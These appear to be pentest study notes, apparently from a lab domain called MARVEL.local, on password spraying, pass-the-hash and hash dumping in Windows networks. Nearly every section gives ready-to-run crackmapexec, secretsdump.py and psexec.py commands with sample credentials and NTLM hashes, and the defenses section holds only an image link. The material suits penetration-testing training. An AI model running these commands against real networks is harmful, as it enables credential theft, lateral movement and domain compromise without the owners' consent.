### Pass the Password Attacks
For instance if you compromise a host in a network and somehow manage to crack the hash and get the password of the user. You can now perform pass the password attack where you will be spraying the compromised user's password all over the network and see if someone is using the same credentials and can compromise the domain

For passing the hash we can use a tool called `crackmapexec` which can be installed using the following command
```bash
apt install crackmapexec
```

Now using this we can spray password to the network. Use the following command
```bash
# Syntax for spraying password
crackmapexec <protocol> <Network Range> -u <username> -d <domain> -p <password>

# Example
crackmapexec smb 192.168.247.0/24 -u fcastle -d MARVEL.local -p Password1
```
![[Pasted image 20210726092129.png]]

You can also dump sam hashes with crackmapexec
```bash
```bash
# Syntax for spraying password
crackmapexec <protocol> <Network Range> -u <username> -d <domain> -p <password> --sam

#Example
crackmapexec smb 192.168.247.0/24 -u fcastle -d MARVEL.local -p Password1 --sam
```
![[Pasted image 20210726092703.png]]

### Dumping Hashes with secretsdump.py
Once we know the password and username of a machine we can dump all hashes using secretsdump.py.

For doing so type the following command
```bash
#Syntax for dumping hashes
secretsdump.py <domain>/<username>:<password>@<IP address>

#Example
secretsdump.py marvel/fcastle:Password1@192.168.247.130
```

![[Pasted image 20210726093643.png]]

After dumping you can try to crack these hashes with hashcat

### Pass the Hash Attacks
Pass the Hash attack is another powerfull attack where an attacker can utilise the hashes without cracking it and spray in the network and see who is utilizing the same hashes

**Note**: Only NTLM hashes can be used for spraying hashes. NTLMv2 will not work in pass the hash attacks

We will be using `crackmapexec` for this. Type the following command
```bash
#Syntax for passing the hash
crackmapexec <protocol> <Network Range> -u <username> -H <Hash> --local-auth

#Example
crackmapexec smb 192.168.247.0/24 -u "Frank Castle" -H a4f49c406510bdcab6824ee7c30fd852 --local-auth
```

Here `--local-auth` is used because we are targeting local administrators or users

![[Pasted image 20210726095348.png]]

We can also use `psexec.py` to login with the hashes
```bash
#Syntax for logging in with hashes
psexec.py "<username>":@<IP Address> -hashes <LM>:<NT>

#Example
psexec.py "Frank Castle":@192.168.247.130 -hashes aad3b435b51404eeaad3b435b51404ee:a4f49c406510bdcab6824ee7c30fd852
```
![[Pasted image 20210726095717.png]]

### Defenses
![[Pasted image 20210726100026.png]]